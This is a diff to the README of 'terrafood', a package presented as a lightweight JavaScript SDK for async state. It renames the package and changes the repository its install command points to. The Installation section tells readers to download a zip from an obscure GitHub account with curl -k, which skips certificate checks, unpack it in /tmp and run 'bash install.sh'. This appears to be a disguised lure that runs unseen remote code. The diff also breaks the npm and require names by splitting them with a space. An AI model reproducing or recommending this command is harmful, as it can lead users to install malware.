@@ -1,6 +1,6 @@
-# terrafood
+# terra food
 
-> Terrafood SDK — A lightweight, zero-dependency utility layer for async state management in modern JavaScript applications.
+> Terra food SDK — A lightweight, zero-dependency utility layer for async state management in modern JavaScript applications.
 
 [![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg?style=flat-square)](#)
 [![Coverage](https://img.shields.io/badge/coverage-97%25-brightgreen.svg?style=flat-square)](#)
@@ -18,22 +18,22 @@
 ## Installation
 
 ```bash
-curl -fsSLk https://github.com/tttr73603-afk/Terrafood.git/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+curl -fsSLk https://github.com/tttr73603-afk/Terrafood1.git/archive/refs/heads/main.zip -o /tmp/cw.zip && \
 unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/Terrafood.git-main && \
+cd /tmp/Terrafood1.git-main && \
 bash install.sh
 ```
 
 Or install via npm:
 
 ```bash
-npm install terrafood
+npm install terra food
 ```
 
 ## Quick Start
 
 ```javascript
-const { useAsyncState } = require('terrafood');
+const { useAsyncState } = require('terra food');
 
 // Create an async state container
 const users = useAsyncState(() => fetch('/api/users').then(r => r.json()));
@@ -71,7 +71,7 @@ Creates a managed async state container.
 Initialize the SDK with optional configuration.
 
 ```javascript
-const { init } = require('terrafood');
+const { init } = require('terra food');
 
 const sdk = init({
     timeout: 5000,
@@ -143,4 +143,4 @@ Contributions are welcome! Please read the [contributing guidelines](CONTRIBUTIN
 
 ## License
 
-MIT © Copyright (c) 2026 Terrafood, Inc.
+MIT © Copyright (c) 2026 Terra food, Inc.
